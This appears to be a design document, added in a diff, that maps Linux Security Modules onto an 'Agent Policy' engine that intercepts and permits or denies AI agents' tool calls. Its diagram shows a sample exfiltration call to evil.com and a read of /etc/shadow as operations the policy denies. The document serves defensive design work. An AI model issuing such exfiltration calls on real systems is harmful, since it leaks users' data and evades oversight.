@@ -1,0 +1,332 @@
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+                                    THE LSM ANALOG: FROM KERNEL SECURITY TO AGENT SECURITY
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+Document 1 of 4 - Theoretical Foundations
+Author: David Kypuros
+Created: January 2026
+
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+                                                 THE CORE INSIGHT
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+
+Agent Policy is not a new idea. It is the SAME idea that Chris Wright and the LSM team applied to
+the Linux kernel in 2001, now applied to AI agents in 2026.
+
+The insight is structural:
+
+  EVERY EXECUTION ENVIRONMENT NEEDS THE SAME THREE THINGS:
+    1. A way to INTERCEPT operations before they execute
+    2. A way to EVALUATE those operations against policy
+    3. A way to ENFORCE decisions (allow/deny)
+
+This pattern appears at every layer of the computing stack:
+
+  LAYER              │ INTERCEPT              │ EVALUATE           │ ENFORCE
+  ───────────────────│────────────────────────│────────────────────│────────────────────────
+  Linux Kernel       │ LSM hooks              │ Security server    │ Return -EACCES
+  Virtualization     │ libvirt security       │ sVirt driver       │ Deny VM operation
+  Containers         │ go-selinux             │ Container policy   │ Block container action
+  Kubernetes         │ Admission webhooks     │ Pod Security       │ Reject pod spec
+  AI Agents          │ Router intercept       │ Policy Engine      │ gRPC PermissionDenied
+
+Agent Policy is the AI Agent row of this table.
+
+
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+                                         THE HISTORY: HOW LSM CAME TO BE
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+
+LINUX BEFORE LSM (Pre-2001)
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+In 2000, Linux had:
+  • Process isolation (separate address spaces)
+  • User permissions (DAC - Discretionary Access Control)
+  • File permissions (rwx for user/group/other)
+
+But enterprises couldn't deploy Linux in high-security environments because:
+  • Root could do ANYTHING (no mandatory constraints)
+  • A compromised process could access anything the user could access
+  • No way to PROVE a process couldn't do something
+
+The NSA had developed SELinux, but it was a monolithic patch that:
+  • Was hard to maintain across kernel versions
+  • Couldn't coexist with other security models
+  • Required extensive kernel modifications
+
+
+THE LSM SOLUTION (2001-2003)
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+Chris Wright and others proposed Linux Security Modules (LSM):
+
+  "Instead of hardcoding one security model, let's create HOOKS at security-relevant
+   points in the kernel. Any security module can register to receive these hooks
+   and make its own decisions."
+
+The architecture:
+
+  ┌─────────────────────────────────────────────────────────────────────────────────┐
+  │                              LINUX KERNEL                                        │
+  │                                                                                 │
+  │   User Process                                                                  │
+  │        │                                                                        │
+  │        ▼                                                                        │
+  │   System Call (e.g., open("/etc/shadow", O_RDONLY))                            │
+  │        │                                                                        │
+  │        ▼                                                                        │
+  │   ┌─────────────────────────────────────────────────────────────────────────┐  │
+  │   │                         LSM HOOK POINT                                  │  │
+  │   │                                                                         │  │
+  │   │   security_file_permission(file, mask)                                  │  │
+  │   │        │                                                                │  │
+  │   │        ▼                                                                │  │
+  │   │   ┌─────────────────────────────────────────────────────────────────┐  │  │
+  │   │   │              SECURITY MODULE (e.g., SELinux)                    │  │  │
+  │   │   │                                                                 │  │  │
+  │   │   │   1. Get process security context (httpd_t)                     │  │  │
+  │   │   │   2. Get file security context (shadow_t)                       │  │  │
+  │   │   │   3. Check policy: "Can httpd_t read shadow_t?"                 │  │  │
+  │   │   │   4. Return: ALLOW or DENY                                      │  │  │
+  │   │   │                                                                 │  │  │
+  │   │   └─────────────────────────────────────────────────────────────────┘  │  │
+  │   │        │                                                                │  │
+  │   │        ▼                                                                │  │
+  │   │   If DENY: return -EACCES (permission denied)                          │  │
+  │   │   If ALLOW: continue with operation                                    │  │
+  │   │                                                                         │  │
+  │   └─────────────────────────────────────────────────────────────────────────┘  │
+  │        │                                                                        │
+  │        ▼                                                                        │
+  │   Execute Operation (if allowed)                                                │
+  │                                                                                 │
+  └─────────────────────────────────────────────────────────────────────────────────┘
+
+KEY DESIGN DECISIONS:
+
+  1. HOOKS, NOT PATCHES
+     LSM doesn't modify kernel logic. It inserts hook points that call out to modules.
+     The kernel continues to work even if no security module is loaded.
+
+  2. MODULAR SECURITY
+     Different security models (SELinux, AppArmor, Smack) can all use the same hooks.
+     Enterprises choose which model fits their needs.
+
+  3. FAIL-SECURE
+     If the security module denies, the operation fails. The kernel enforces the decision.
+
+  4. AUDITABLE
+     Every decision can be logged. The AVC (Access Vector Cache) records denials.
+
+
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+                                         THE ANALOG: LSM → AGENT POLICY
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+
+Now apply the EXACT same pattern to AI agents:
+
+AGENTIC AI BEFORE AGENT POLICY (2025)
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+In 2025, Agent Sandbox has:
+  • Sandbox isolation (gVisor/Kata - process can't escape)
+  • Tool configuration (agents have configured tools)
+  • Resource limits (CPU, memory, network quotas)
+
+But enterprises can't deploy AI agents in production because:
+  • Agents can call ANY configured tool (no mandatory constraints)
+  • A prompt-injected agent can misuse tools within its sandbox
+  • No way to PROVE an agent can't do something specific
+
+
+THE AGENT POLICY SOLUTION (2026)
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+
+Agent Policy proposes the same architecture:
+
+  "Instead of trusting isolation alone, let's create INTERCEPT POINTS at tool invocation.
+   A policy engine evaluates each tool call and makes allow/deny decisions."
+
+The architecture:
+
+  ┌─────────────────────────────────────────────────────────────────────────────────┐
+  │                           AGENTIC KERNEL (Agent Sandbox)                         │
+  │                                                                                 │
+  │   AI Agent                                                                      │
+  │        │                                                                        │
+  │        ▼                                                                        │
+  │   Tool Call (e.g., network.fetch("http://evil.com/exfiltrate"))                │
+  │        │                                                                        │
+  │        ▼                                                                        │
+  │   ┌─────────────────────────────────────────────────────────────────────────┐  │
+  │   │                      ROUTER INTERCEPT POINT                             │  │
+  │   │                                                                         │  │
+  │   │   policyEngine.Evaluate(agentCtx, "network.fetch", request)             │  │
+  │   │        │                                                                │  │
+  │   │        ▼                                                                │  │
+  │   │   ┌─────────────────────────────────────────────────────────────────┐  │  │
+  │   │   │              POLICY ENGINE (Agent Policy)                       │  │  │
+  │   │   │                                                                 │  │  │
+  │   │   │   1. Get agent context (coding-assistant, sandbox-123)          │  │  │
+  │   │   │   2. Get tool policy (network.fetch constraints)                │  │  │
+  │   │   │   3. Check: "Can coding-assistant fetch from evil.com?"         │  │  │
+  │   │   │   4. Return: ALLOW or DENY                                      │  │  │
+  │   │   │                                                                 │  │  │
+  │   │   └─────────────────────────────────────────────────────────────────┘  │  │
+  │   │        │                                                                │  │
+  │   │        ▼                                                                │  │
+  │   │   If DENY: return gRPC PermissionDenied                                │  │
+  │   │   If ALLOW: route to sandbox for execution                             │  │
+  │   │                                                                         │  │
+  │   └─────────────────────────────────────────────────────────────────────────┘  │
+  │        │                                                                        │
+  │        ▼                                                                        │
+  │   Execute Tool (if allowed)                                                     │
+  │                                                                                 │
+  └─────────────────────────────────────────────────────────────────────────────────┘
+
+
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+                                         THE COMPONENT MAPPING
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+
+Every LSM component has a direct analog in Agent Policy:
+
+  LSM COMPONENT                     │ AGENT POLICY COMPONENT          │ PURPOSE
+  ──────────────────────────────────│─────────────────────────────────│──────────────────────────────────
+  Security Context                  │ Agent Context                   │ Identity of the actor
+    user:role:type:level            │   agent:sandbox:caps:tier       │
+                                    │                                 │
+  LSM Hooks                         │ Router Intercept                │ Point where decisions are made
+    security_file_permission()      │   policyEngine.Evaluate()       │
+                                    │                                 │
+  Security Server                   │ Policy Engine                   │ Evaluates requests against policy
+    SELinux policy compiler         │   engine.go                     │
+                                    │                                 │
+  Type Enforcement                  │ Tool Enforcement                │ Rules about what can do what
+    httpd_t can read httpd_content  │   coding_agent can call exec    │
+                                    │                                 │
+  AVC (Access Vector Cache)         │ Decision Cache                  │ Fast lookup for repeated requests
+    Caches allow/deny decisions     │   cache.go                      │
+                                    │                                 │
+  MCS (Multi-Category Security)     │ MTS (Multi-Tenant Sandboxing)   │ Isolation between tenants
+    s0:c123,c456 isolates VMs       │   tenant:project categories     │
+                                    │                                 │
+  Policy Modules                    │ AgentPolicy CRD                 │ Declarative policy definition
+    selinux-policy-targeted.te      │   coding-agent-policy.yaml      │
+                                    │                                 │
+  Audit Log (AVC denials)           │ Audit Events                    │ Compliance and forensics
+    /var/log/audit/audit.log        │   Structured JSON events        │
+
+
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+                                         THE ARCHITECTURAL PRINCIPLE
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+
+The principle that makes this work is:
+
+  MANDATORY ACCESS CONTROL (MAC) OPERATES AT THE BOUNDARY
+
+In LSM:
+  • The boundary is the syscall interface
+  • Every syscall that affects security has a hook
+  • The security module can't be bypassed by the process
+
+In Agent Policy:
+  • The boundary is the Router (tool invocation interface)
+  • Every tool call passes through the Router
+  • The Policy Engine can't be bypassed by the agent
+
+This is why Agent Policy is implemented IN THE ROUTER, not as a sidecar or external service.
+The agent cannot make tool calls without going through the Router.
+The Router is the syscall interface of the agentic kernel.
+
+
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+                                         WHY THIS ARCHITECTURE PERSISTS
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+
+LSM was merged into Linux in 2003. It's still there in 2026, largely unchanged.
+SELinux is default on RHEL, CentOS, Fedora. Required for FedRAMP.
+
+Why did this architecture survive 23+ years?
+
+  1. IT SOLVES THE RIGHT PROBLEM
+     The problem isn't "how do we make things more secure?"
+     The problem is "how do we PROVE things can't do X?"
+     MAC provides provable constraints.
+
+  2. IT'S MINIMAL
+     LSM doesn't change how the kernel works.
+     It just adds decision points.
+     Minimal footprint = minimal maintenance burden.
+
+  3. IT'S FLEXIBLE
+     Different organizations have different security needs.
+     LSM supports SELinux, AppArmor, Smack, etc.
+     Agent Policy supports different agent profiles.
+
+  4. IT'S AUDITABLE
+     Every decision is logged.
+     Compliance requires evidence.
+     The audit trail is built in.
+
+Agent Policy inherits all of these properties because it follows the same architecture.
+
+
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+                                         THE GENERALIZATION
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+
+LSM and Agent Policy are instances of a more general pattern:
+
+  HOOK-BASED SECURITY ARCHITECTURE
+
+  ┌─────────────────────────────────────────────────────────────────────────────────┐
+  │                                                                                 │
+  │   EXECUTION ENVIRONMENT                                                         │
+  │        │                                                                        │
+  │        ▼                                                                        │
+  │   ┌─────────────────┐      ┌─────────────────┐      ┌─────────────────┐        │
+  │   │    OPERATION    │ ──▶  │      HOOK       │ ──▶  │    SECURITY     │        │
+  │   │   (syscall,     │      │   (intercept    │      │     MODULE      │        │
+  │   │    tool call)   │      │    point)       │      │   (evaluator)   │        │
+  │   └─────────────────┘      └─────────────────┘      └─────────────────┘        │
+  │                                   │                        │                    │
+  │                                   │                        │                    │
+  │                                   ▼                        ▼                    │
+  │                            ┌─────────────────┐      ┌─────────────────┐        │
+  │                            │     POLICY      │      │     AUDIT       │        │
+  │                            │   (rules)       │      │     LOG         │        │
+  │                            └─────────────────┘      └─────────────────┘        │
+  │                                                                                 │
+  └─────────────────────────────────────────────────────────────────────────────────┘
+
+This pattern appears at EVERY layer of the computing stack.
+It will appear at every FUTURE layer.
+
+Agent Policy is not the end. It's the AI Agent instance of a timeless pattern.
+
+
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+                                              CONCLUSION
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+
+Agent Policy is the SELinux of the agentic kernel.
+
+The theoretical foundation is not "here's a new idea."
+The theoretical foundation is "here's a proven pattern applied to a new domain."
+
+Chris Wright's insight in 2001: Security shouldn't be hardcoded. It should be modular,
+with hooks at decision points.
+
+My insight in 2026: The same architecture applies to AI agents. The Router is the syscall
+interface. The Policy Engine is the security server. AgentPolicy CRD is the policy module.
+
+The pattern is timeless.
+The implementation is new.
+
+
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+                                              END OF DOCUMENT
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
